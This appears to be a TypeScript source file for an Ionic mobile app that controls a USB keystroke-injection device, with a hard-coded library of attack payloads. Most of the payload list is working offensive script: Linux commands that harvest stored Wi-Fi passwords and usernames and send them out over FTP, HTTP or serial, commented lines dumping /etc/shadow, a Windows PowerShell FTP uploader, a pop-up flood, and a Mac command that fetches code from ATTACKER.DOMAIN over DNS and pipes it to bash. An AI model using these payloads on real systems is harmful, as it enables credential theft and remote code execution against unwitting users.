import { Component, OnInit } from '@angular/core';
import { AlertController, NavController } from '@ionic/angular';
import { ApiService } from '../api.service';
// import { LivePayloadPage } from '../live-payload/live-payload.page';
import { NavExtrasService } from '../nav-extras-service.service';
import { Router } from '@angular/router';
import { ToastService } from '../toast.service';

@Component({
  selector: 'app-list',
  templateUrl: 'list.page.html',
  styleUrls: ['list.page.scss']
})
export class ListPage implements OnInit {
  private selectedItem: any;
  public items = [];
  public filteredData = [];

  private icons = [
    'flask',
    'wifi',
    'beer',
    'football',
    'basketball',
    'paper-plane',
    'american-football',
    'boat',
    'bluetooth',
    'build'
  ];
  constructor(public alertController: AlertController, public api: ApiService, public navCtrl: NavController, public navExtrasService: NavExtrasService, public router: Router, public toast: ToastService) {}

  async dialogDelete(item: any) {
    
    const alert = await this.alertController.create({
      header: 'Delete scriptlet',
      // subHeader: 'Subtitle',
      message: 'Are you sure you want to delete this scriptlet ?',
      buttons: [
        {
          text: 'Cancel',
          role: 'cancel',
          cssClass: 'secondary',
          handler: (blah) => {
            console.log('Confirm Cancel: blah');
          }
        }, {
          text: 'Yes',
          handler: () => {
            console.log('Confirm Okay');
            this.api.removePayload(item['title']).then(() => {
              if (item['platform'] === "Remote") {
                this.toast.showToastMessage("Deleting remote payload " + item['title']);
                this.api.deleteRemotePayload(item['title']);                
              } else {
                this.toast.showToastMessage("Deleting " + item['title'] + " scriptlet!");  
              }
              let index = this.items.indexOf(item);
              this.items.splice(index, 1);
            });
          }
        }
      ]
    });
    await alert.present();
  }

  doFilter(value:string) {
    value = value.toLowerCase();
    this.filteredData = Object.assign([], this.items).filter(
      item => item.title.toLowerCase().indexOf(value) > -1 || item.note.toLowerCase().indexOf(value) > -1 || item.platform.toLowerCase().indexOf(value) > -1
    )
  }

  passPayloadToLiveMode(item: any) {
    this.navExtrasService.setPayload(item);
    this.router.navigateByUrl('/live-payload');
  }

  async flush() {
    const alert = await this.alertController.create({
      header: 'Flush',
      // subHeader: 'Subtitle',
      message: 'Are you sure you want to delete ALL the scriptlets ?',
      buttons: [
        {
          text: 'Cancel',
          role: 'cancel',
          cssClass: 'secondary',
          handler: (blah) => {
            console.log('Confirm Cancel: blah');
          }
        }, {
          text: 'Yes',
          handler: () => {
            console.log('Confirm Okay');
            this.api.flushPayloads().then(() => {
              this.toast.showToastMessage("Flushing all the scriptlets!");
              this.items = [];
            });
          }
        }
      ]
    });
    await alert.present();
  }

  ionViewWillEnter() {
    this.initItems();
  }

  refresh(event) {
    this.initItems();
    setTimeout(() => {
      event.target.complete();
    }, 2000);
  }

  initItems() {
    // I got the list of payloads from here: https://github.com/exploitagency/ESPloitV2/blob/master/payloads/
    // Big props to those guys and all the credits go to those people!
    this.items = [
      // Linux payloads
      {
        'icon': 'bug',
        'title': 'Wi-Fi Creds Exfil',
        'note': 'Rem: Exfiltrate WiFi Passwords from Linux Box\nRem: ESPloit and Target must be connected to the same network for this to work\nRem: Set the IP/User/Pass of ESPloit below by modifying "export xip=\'192.168.1.1\'", "ftpuser=\'ftp-admin\'", and "ftppass=\'hacktheplanet\'"\nPress:134+195\nPrintLine:gnome-terminal\nCustomDelay:1000\nPrintLine:cd /etc/NetworkManager/system-connections; grep psk= *|paste -sd,>~/capture.txt; cd ~; export xfile=\'capture.txt\'; export ftpuser=\'ftp-admin\'; export ftppass=\'hacktheplanet\'; export xip=\'192.168.1.1\'\nRem: Wait for FTP server to be ready\nCustomDelay:5000\nPrintLine:curl -T ${xfile} ftp://${ftpuser}:${ftppass}@${xip}/${xfile}; rm capture.txt; exit',
        'platform': 'Linux'
      },
      {
        'icon': 'bug',
        'title': 'FTP Exfil',
        'note': 'Rem: Exfiltrate UserName from Linux Box\nRem: ESPloit and Target must be connected to the same network for this to work\nRem: Set the IP/User/Pass of ESPloit below by modifying "export xip=\'192.168.1.1\'", "ftpuser=\'ftp-admin\'", and "ftppass=\'hacktheplanet\'"\nPress:134+195\nPrintLine:gnome-terminal\nPrintLine:export xfile=\'LinuxUser.txt\'; export ftpuser=\'ftp-admin\'; export ftppass=\'hacktheplanet\'; data="$(whoami)"; echo ${data}>${xfile}; export xip=\'192.168.1.1\'\nRem: Wait for FTP server to be ready\nCustomDelay:5000\nPrintLine:curl -T ${xfile} ftp://${ftpuser}:${ftppass}@${xip}/${xfile}\n',
        'platform': 'Linux'
      },
      {
        'icon': 'bug',
        'title': 'HTTP Exfil',
        'note': 'Rem: Exfiltrate UserName from Linux Box\nRem: ESPloit and Target must be connected to the same network for this to work\nRem: Set the IP of ESPloit below by modifying "export xip=\'192.168.1.1\'"\nPress:134+195\nPrintLine:gnome-terminal\nPrintLine:data="$(whoami)"; export xip=\'192.168.1.1\'; export xfile=\'LinuxUser.txt\'; curl "http://${xip}/exfiltrate?file=${xfile}&data=${data}"; exit\n',
        'platform': 'Linux'
      },
      {
        'icon': 'bug',
        'title': 'Serial Exfil',
        'note': 'Rem: Exfiltrate UserName from Linux Box using a Serial Link\nRem: We need to set the DefaultDelay low and and use a delay higher than that right before the exfiltrated data\nDefaultDelay:50\nPress:134+195\nCustomDelay:1000\nPrintLine:gnome-terminal\nCustomDelay:1000\nRem: Exfiltrate User and BlinkLED:3 when done\nPrintLine:sleep .5;stty -F /dev/serial/by-id/*LilyPad* 38400;echo -e "SerialEXFIL:"$(whoami)"\nBlinkLED:3" > /dev/serial/by-id/*LilyPad*;exit\nRem: -\nRem: More examples below\nRem: PrintLine:stty -F /dev/serial/by-id/*LilyPad* 38400;echo "SerialEXFIL:"$(whoami) > /dev/serial/by-id/*LilyPad*\nRem: In example below replace "LINUX COMMAND HERE": PrintLine:stty -F /dev/serial/by-id/*LilyPad* 38400;sleep .5;echo -e "SerialEXFIL:"$(LINUX COMMAND HERE)"\nBlinkLED:3" > /dev/serial/by-id/*LilyPad*\nRem: Dump shadow file: PrintLine:stty -F /dev/serial/by-id/*LilyPad* 38400;sleep .5;echo -e "SerialEXFIL:"$(cat /etc/shadow)"\nBlinkLED:3" > /dev/serial/by-id/*LilyPad*\nRem: Dump shadow file for current user: PrintLine:stty -F /dev/serial/by-id/*LilyPad* 38400;echo "SerialEXFIL:"$(cat /etc/shadow|grep $(whoami)) > /dev/serial/by-id/*LilyPad*\nRem: Another way to access device: PrintLine:stty -F /dev/ttyACM0 38400;echo "SerialEXFIL:"$(whoami) > /dev/ttyACM0\n',
        'platform': 'Linux'
      },
      {
        'icon': 'bug',
        'title': 'Execute hidden payload',
        'note': 'DefaultDelay:2000\nCustomDelay:5000\nRem: Press ALT F2\nRem: Opens Application Finder\nPress:134+195\nPrintLine:gnome-terminal\nPrintLine:nano\nPrintLine:echo Payload Here.\nPrintLine:echo Test Successful!\nRem: Press CTRL x to save\nPress:128+120\nRem: type y for yes\nPrint:y\nRem: File Name payload.sh\nPrintLine:payload.sh\nRem: Make executable\nPrintLine:chmod 777 ./payload.sh\nRem: Run payload\nPrintLine:./payload.sh\nPrintLine:rm payload.sh\nPrintLine:exit',
        'platform': 'Linux'
      },
      // Windows payloads
      {
        'icon': 'bonfire',
        'title': 'HTTP Exfiltrate',
        'note': 'Rem: Exfiltrate UserName from Windows Box\nRem: ESPloit and Target must be connected to the same network for this to work\nRem: Set the IP of ESPloit below by changing "SET ip=192.168.1.1"\nPress:131+114\nPrintLine:cmd\nPrintLine:whoami>tmp& SET /P data=&lt;tmp& del tmp& SET file=WinUser.txt& SET ip=192.168.1.1\nPrintLine:SET url=^"http:///%ip%/exfiltrate^?file^=%file%^&data^=%data%^"\nPrintLine:explorer %url%&exit',
        'platform': 'Windows'
      },
      {
        'icon': 'bonfire',
        'title': 'PowerShell FTP Exfiltrate',
        'note': 'Rem:Based on example from https://stackoverflow.com/a/2485696/537243\nRem:Due to formatting the exfiltrated data may not show up properly when viewing it in "List Exfiltrated Data"\nRem:To get around this issue simply click on "Download File" when on the "List Exfiltrated Data" page\nDefaultDelay:2000\nPress:131+114\nPrintLine:powershell\nCustomDelay:3000\nPrintLine:whoami | Out-File data\nPrintLine:notepad ftp.ps1\nCustomDelay:1000\nPress:176\nCustomDelay:1000\nRem:Modify the line below with your settings\nPrintLine:\nPrintLine:$ftpURI = "ftp://ftp-admin:hacktheplanet@192.168.1.1/data"\nPrintLine:$webclient = New-Object -TypeName System.Net.WebClient;\nPrintLine:$ftpURI = New-Object -TypeName System.Uri -ArgumentList $ftpURI;\nPrintLine:$webclient.UploadFile($ftpURI, [System.ENVIRONMENT]::CurrentDirectory + "\\data");\nPrintLine:Write-output  "Uploaded file ... ";\nPress:130+197\nCustomDelay:1000\nPrintLine:s\nPress:176\nCustomDelay:1000\nPrintLine:\nCustomDelay:5000\nPrintLine:.\x0ctp.ps1',
        'platform': 'Windows'
      },
      {
        'icon': 'bonfire',
        'title': 'Serial Exfil',
        'note': 'Rem: Exfiltrate the username from a Windows machine\nRem: This payload was written by Luca Bongiorni\nRem: You may need to adjust the delays depending on the hardware specs for the machine\nRem: Tested on Windows 10 Enterprise\nDefaultDelay:50\nCustomDelay:3000\nPress:131+114\nCustomDelay:1000\nPrintLine:powershell\nCustomDelay:1000\nPrintLine:$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace "root\\CIMV2" -Filter "PNPDeviceID like \'USB\\VID_1b4f&PID_9208%\'").Caption; $com=[regex]::match($s,\'\\(([^\\)]+)\\)\').Groups[1].Value; $cmd=whoami; $port= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one; $port.open(); $port.WriteLine("SerialEXFIL:$cmd"); $port.Close(); exit;\n',
        'platform': 'Windows'
      },
      {
        'icon': 'bonfire',
        'title': 'Hidden payload',
        'note': 'Rem: Proof of concept for creating and running a payload.bat file and then deleting it.\nDefaultDelay:2000\nCustomDelay:5000\nRem: 131 is "Windows Key or GUI" and 114 is "r"\nRem: Brings up run menu\nPress:131+114\nPrintLine:cmd\nPrintLine:echo echo Payload Here.>>payload.bat\nPrintLine:echo echo Test Successful!>>payload.bat\nPrintLine:payload.bat\nPrintLine:del payload.bat\nPrintLine:exit',
        'platform': 'Windows'
      },
      {
        'icon': 'bonfire',
        'title': 'kiOSK attack',
        'note': 'Rem: Run\nPress:131+114\nRem: Bring up on screen keyboard\nPrintLine:osk',
        'platform': 'Windows'
      },
      {
        'icon': 'bonfire',
        'title': 'Pop up attacks',
        'note': 'Rem: Creates a bat file that loops the msg command creating lots of popup messages.\nDefaultDelay:2000\nCustomDelay:5000\nRem: 131 is "Windows Key or GUI" and 114 is "r"\nRem: Brings up run menu\nPress:131+114\nPrintLine:cmd\nPrintLine:echo :start>>payload.bat\nPrintLine:echo msg * Hello from ESPloit!>>payload.bat\nPrintLine:echo goto start>>payload.bat\nPrintLine:payload.bat\nRem: 131 is "Windows Key or GUI" and 100 is "d"\nRem: Shows Desktop\nPress:131+100',
        'platform': 'Windows'
      },
      // Mac payloads
      {
        'icon': 'flame',
        'title': 'Keyboard sync up',
        'note': 'Rem: Apple\'s OS X does not allow plugging in a keyboard and immediately pressing buttons.\nRem: It requires Right of Left Shift Key, "z", and Left of Right Shift Key, "/", to be pressed to identify the keyboard layout as English.\nRem: This payload is a workaround and is only needs to be ran the first time the device is inserted, on future inserts this is not required.\nRem: Instructions.\nRem: Set this payload to run as automatic and insert the device or run it through the browser.\nRem: Manually click "Continue", the payload will press the required keys to identify the keyboard.\nRem: Now manually click "Done".\nDefaultDelay:2000\nCustomDelay:5000\nPress:122\nCustomDelay:3000\nPress:47',
        'platform': 'Mac'
      },
      {
        'icon': 'flame',
        'title': 'Command Execution',
        'note': 'Press:131+32\nCustomDelay:1000\nPrint:calculator\nCustomDelay:1000\nPress:176',
        'platform': 'Mac'
      },
      {
        'icon': 'flame',
        'title': 'DNS RCE',
        'note': 'Press:131+32\nDelay\nPrintLine:terminal\nDelay\nPrintLine:nslookup -querytype=txt calculatorb64.ATTACKER.DOMAIN | grep text | cut -d \'"\' -f2 |  base64 -D | /bin/bash',
        'platform': 'Mac'
      },
      {
        'icon': 'flame',
        'title': 'Empyre payload',
        'note': 'DefaultDelay:1000\nPress:131+32\nPrint:terminal\nPress:176\nPrint:echo "import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode(\'aW1wb3J0........BLABLABLABLABLABLAB................am9pbihvdXQpKQ==\'));" | python &\nPress:176',
        'platform': 'Mac'
      }
    ];

    // Get local payloads
    this.api.getPayloads().then((val) => {
      console.log(val);
      for (var property in val) {
        if (val.hasOwnProperty(property)) {
          this.items.push({
            title: property,
            note: val[property],
            icon: this.icons[Math.floor(Math.random() * this.icons.length)],
          });  
        }
      }      
    })

    // get remote payloads
    this.api.getRemotePayloads().then((content) => {
        var regexp = /showpayload\?payload=(\S+)"/gm;
        var results = null;
        do {
          results = regexp.exec(content.data);
          if (results !== null) {
            var tmpVal = {
              'icon': 'nuclear',
              'title': results[1],
              'note': 'Custom payload fetched on WHID',
              'platform': 'Remote'
            }
            this.items.push(tmpVal);
          }
        } while (results !== null);
      });
    this.filteredData = this.items;
  }

  ngOnInit() {
  }
  // add back when alpha.4 is out
  // navigate(item) {
  //   this.router.navigate(['/list', JSON.stringify(item)]);
  // }
}
